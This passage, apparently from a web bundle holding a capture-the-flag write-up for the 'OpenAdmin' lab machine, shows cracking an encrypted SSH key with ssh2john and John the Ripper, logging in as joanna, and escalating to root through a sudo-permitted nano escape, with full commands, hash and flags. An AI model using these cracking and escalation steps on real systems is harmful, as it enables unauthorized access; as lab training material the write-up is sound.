encrypted and\npassword protected but we also have a hint to crack it:\n",(0,o.kt)("em",{parentName:"p"},'Don\'t forget your "ninja" password'),"."),(0,o.kt)("p",null,"Let's crack it with ",(0,o.kt)("a",{parentName:"p",href:"https://www.openwall.com/john/"},"JtR (John the Ripper)"),":"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'$ ssh2john id_rsa\n/usr/bin/ssh2john:103: DeprecationWarning: decodestring() is a deprecated alias since Python 3.1, use decodebytes()\n  data = base64.decodestring(data)\nid_rsa:$sshng$1$16$2AF25344B8391A25A9B318F3FD767D6D$1200$906d14608706c9ac6ea6342a692d9ed47a9b87044b94d72d5b61df25e68a5235991f8bac883f40b539c829550ea5937c69dfd2b4c589f8c910e4c9c030982541e51b4717013fafbe1e1db9d6331c83cca061cc7550c0f4dd98da46ec1c7f460e4a135b6f1f04bafaf66a08db17ecad8a60f25a1a095d4f94a530f9f0bf9222c6736a5f54f1ff93c6182af4ad8a407044eb16ae6cd2a10c92acffa6095441ed63215b6126ed62de25b2803233cc3ea533d56b72d15a71b291547983bf5bee5b0966710f2b4edf264f0909d6f4c0f9cb372f4bb323715d17d5ded5f83117233976199c6d86bfc28421e217ccd883e7f0eecbc6f227fdc8dff12ca87a61207803dd47ef1f2f6769773f9cb52ea7bb34f96019e00531fcc267255da737ca3af49c88f73ed5f44e2afda28287fc6926660b8fb0267557780e53b407255dcb44899115c568089254d40963c8511f3492efe938a620bde879c953e67cfb55dbbf347ddd677792544c3bb11eb0843928a34d53c3e94fed25bff744544a69bc80c4ffc87ffd4d5c3ef5fd01c8b4114cacde7681ea9556f22fc863d07a0f1e96e099e749416cca147add636eb24f5082f9224e2907e3464d71ae711cf8a3f21bd4476bf98c633ff1bbebffb42d24544298c918a7b14c501d2c43534b8428d34d500537f0197e75a4279bbe4e8d2acee3c1586a59b28671e406c0e178b4d29aaa7a478b0258bde6628a3de723520a66fb0b31f1ea5bf45b693f868d47c2d89692920e2898ccd89710c42227d31293d9dad740791453ec8ebfb26047ccca53e0a200e9112f345f5559f8ded2f193feedd8c1db6bd0fbfa5441aa773dd5c4a60defe92e1b7d79182af16472872ab3c222bdd2b5f941604b7de582b08ce3f6635d83f66e9b84e6fe9d3eafa166f9e62a4cdc993d42ed8c0ad5713205a9fc7e5bc87b2feeaffe05167a27b04975e9366fa254adf511ffd7d07bc1f5075d70b2a7db06f2224692566fb5e8890c6e39038787873f21c52ce14e1e70e60b8fca716feb5d0727ac1c355cf633226c993ca2f16b95c59b3cc31ac7f641335d80ff1ad3e672f88609ec5a4532986e0567e169094189dcc82d11d46bf73bc6c48a05f84982aa222b4c0e78b18cceb15345116e74f5fbc55d407ed9ba12559f57f37512998565a54fe77ea2a2224abbddea75a1b6da09ae3ac043b6161809b630174603f33195827d14d0ebd64c6e48e0d0346b469d664f89e2ef0e4c28b6a64acdd3a0edf8a61915a246feb25e8e69b3710916e494d5f482bf6ab65c675f73c39b2c2eecdca6709188c6f36b6331953e3f93e27c987a3743eaa71502c43a807d8f91cdc4dc33f48b852efdc8fcc2647f2e588ae368d69998348f0bfcfe6d65892aebb86351825c2aa45afc2e6869987849d70cec46ba951c864accfb8476d5643e7926942ddd8f0f32c296662ba659e999b0fb0bbfde7ba2834e5ec931d576e4333d6b5e8960e9de46d32daa5360ce3d0d6b864d3324401c4975485f1aef6ba618edb12d679b0e861fe5549249962d08d25dc2dde517b23cf9a76dcf482530c9a34762f97361dd95352de4c82263cfaa90796c2fa33dd5ce1d889a045d587ef18a5b940a2880e1c706541e2b523572a8836d513f6e688444af86e2ba9ad2ded540deadd9559eb56ac66fe021c3f88c2a1a484d62d602903793d10d\n\n$ john --wordlist=/usr/share/wordlists/password/rockyou.txt john.txt\nWarning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"\nUse the "--format=ssh-opencl" option to force loading these as that type instead\nUsing default input encoding: UTF-8\nLoaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])\nCost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes\nCost 2 (iteration count) is 1 for all loaded hashes\nWill run 2 OpenMP threads\nNote: This format may emit false positives, so it will keep trying even after\nfinding a possible candidate.\nPress \'q\' or Ctrl-C to abort, almost any other key for status\nbloodninjas      (id_rsa)\nWarning: Only 1 candidate left, minimum 2 needed for performance.\n1g 0:00:00:08 DONE (2020-03-13 17:35) 0.1237g/s 1774Kp/s 1774Kc/s 1774KC/s *7\xa1Vamos!\nSession completed\n')),(0,o.kt)("p",null,"The password is ",(0,o.kt)("inlineCode",{parentName:"p"},"bloodninjas")," to unlock the private key of joanna."),(0,o.kt)("p",null,"We can connect now."),(0,o.kt)("h3",{id:"system-privilege-escalation--joanna-to-root"},"System Privilege Escalation : joanna to root"),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"TL;DR"),": nano escape"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"$ ssh joanna@10.10.10.171 -i id_rsa\njoanna@openadmin:~$ cat user.txt\nc9b2cf07d40807e62af62660f0c81b5f\n\n$ sudo -l\nMatching Defaults entries for joanna on openadmin:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser joanna may run the following commands on openadmin:\n    (ALL) NOPASSWD: /bin/nano /opt/priv\n")),(0,o.kt)("p",null,"EZ pe: escape ",(0,o.kt)("inlineCode",{parentName:"p"},"nano")," thanks to ",(0,o.kt)("a",{parentName:"p",href:"https://gtfobins.github.io/"},"GTFObins")),(0,o.kt)("p",null,"See ",(0,o.kt)("a",{parentName:"p",href:"https://gtfobins.github.io/gtfobins/nano/"},"https://gtfobins.github.io/gtfobins/nano/"),"."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"# cat /root/root.txt\n2f907ed450b361b2c2bf4e8795d5b561\n")))}u.isMDXComponent=!0},75776:(e,n,t)=>{t.d(n,{Z:()=>a});const a=t.p+"assets/images/openadmin-f486e44705cc81bd39817dd6cfe7ee85.png"}}]);